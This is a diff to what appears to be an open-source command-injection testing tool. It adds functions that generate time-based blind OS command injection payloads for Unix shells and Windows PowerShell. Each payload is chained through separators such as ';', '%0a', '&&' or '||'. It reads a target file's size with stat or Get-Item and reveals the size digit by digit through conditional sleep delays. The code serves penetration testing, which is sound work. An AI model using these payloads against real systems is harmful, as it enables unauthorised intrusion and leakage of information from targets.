@@ -563,4 +563,124 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
 
   return checks.sanitize_payload_newlines(payload)
 
+"""
+Efficient file size detection payloads for tempfile-based technique (Issue #783)
+Consolidated functions to reduce code duplication as requested by maintainer
+"""
+
+def get_stat_payload_tfb(filename, separator, timesec, payload_type="length", test_value=None, digit_position=None):
+  """
+  Parameterized stat-based payload generator for tempfile-based technique.
+  
+  Args:
+    filename: Target file to analyze
+    separator: Command separator
+    timesec: Sleep time for time-based detection
+    payload_type: "length" for file size length, "digit" for specific digit
+    test_value: Value to compare against (length or digit value)
+    digit_position: Position of digit to extract (1-based, for digit type only)
+  """
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    # Windows PowerShell commands
+    if payload_type == "length":
+      ps_command = f"([string](Get-Item '{filename}').length).length"
+    elif payload_type == "digit":
+      ps_command = f"([string](Get-Item '{filename}').length).substring({digit_position-1},1)"
+    else:
+      return ""
+    
+    if separator == "|" or separator == "||":
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE +
+                f"for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none {ps_command}\") "
+                f"do if %i=={test_value}" + settings.SINGLE_WHITESPACE +
+                f"cmd /c \"powershell.exe -InputFormat none Start-Sleep -s {2 * timesec + 1}\""
+                )
+    elif separator == _urllib.parse.quote("&&"):
+      ampersand = _urllib.parse.quote("&")
+      payload = (ampersand +
+                f"for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none {ps_command}\") "
+                f"do if %i=={test_value}" + settings.SINGLE_WHITESPACE +
+                f"cmd /c \"powershell.exe -InputFormat none Start-Sleep -s {2 * timesec + 1}\""
+                )
+    else:
+      return ""
+      
+  else:
+    # Unix/Linux stat commands
+    if payload_type == "length":
+      # Length detection using parameter expansion
+      if separator == ";" or separator == "%0a":
+        payload = (separator +
+                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + f"stat --printf='%s' {filename}" + settings.CMD_SUB_SUFFIX + separator +
+                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
+                  f"if [ {test_value} -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
+                  f"then sleep {timesec}" + separator +
+                  "fi"
+                  )
+      elif separator == _urllib.parse.quote("&&"):
+        ampersand = _urllib.parse.quote("&")
+        payload = (ampersand +
+                  "sleep 0 " + separator +
+                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + f"stat --printf='%s' {filename}" + settings.CMD_SUB_SUFFIX + separator +
+                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
+                  f"[ {test_value} -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ] " + separator +
+                  f"sleep {timesec}"
+                  )
+      elif separator == "||":
+        pipe = "|"
+        payload = (pipe +
+                  f"[ {test_value} -ne " + settings.CMD_SUB_PREFIX + f"stat --printf='%s' {filename}" + settings.SINGLE_WHITESPACE +
+                  pipe + "wc -c" + settings.CMD_SUB_SUFFIX + " ] " + separator +
+                  f"sleep {timesec}"
+                  )
+      else:
+        return ""
+        
+    elif payload_type == "digit":
+      # Digit extraction using expr substr
+      if separator == ";" or separator == "%0a":
+        payload = (separator +
+                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + f"stat --printf='%s' {filename}" + settings.CMD_SUB_SUFFIX + separator +
+                  settings.RANDOM_VAR_GENERATOR + f"2=" + settings.CMD_SUB_PREFIX + f"expr substr \"$" + settings.RANDOM_VAR_GENERATOR + f"\" {digit_position} 1" + settings.CMD_SUB_SUFFIX + separator +
+                  f"if [ {test_value} -eq $" + settings.RANDOM_VAR_GENERATOR + "2 ]" + separator +
+                  f"then sleep {timesec}" + separator +
+                  "fi"
+                  )
+      elif separator == _urllib.parse.quote("&&"):
+        ampersand = _urllib.parse.quote("&")
+        payload = (ampersand +
+                  "sleep 0 " + separator +
+                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + f"stat --printf='%s' {filename}" + settings.CMD_SUB_SUFFIX + separator +
+                  settings.RANDOM_VAR_GENERATOR + f"2=" + settings.CMD_SUB_PREFIX + f"expr substr \"$" + settings.RANDOM_VAR_GENERATOR + f"\" {digit_position} 1" + settings.CMD_SUB_SUFFIX + separator +
+                  f"[ {test_value} -eq $" + settings.RANDOM_VAR_GENERATOR + "2 ] " + separator +
+                  f"sleep {timesec}"
+                  )
+      elif separator == "||":
+        pipe = "|"
+        payload = (pipe +
+                  f"[ {test_value} -ne " + settings.CMD_SUB_PREFIX + f"stat --printf='%s' {filename}" + settings.SINGLE_WHITESPACE +
+                  pipe + f"cut -c{digit_position}-{digit_position}" + settings.CMD_SUB_SUFFIX + " ] " + separator +
+                  f"sleep {timesec}"
+                  )
+      else:
+        return ""
+    else:
+      return ""
+
+  if settings.CUSTOM_INJECTION_MARKER:
+    payload = payload + separator
+
+  return payload
+
+
+"""
+Get file size using stat command - length detection (number of digits) for tempfile-based technique
+"""
+def get_stat_output_length(filename, output_length, separator, timesec, http_request_method):
+  return get_stat_payload_tfb(filename, separator, timesec, "length", output_length)
+
+def get_file_size_digit(filename, digit_position, digit_value, separator, timesec, http_request_method):
+  return get_stat_payload_tfb(filename, separator, timesec, "digit", digit_value, digit_position)
+
 # eof
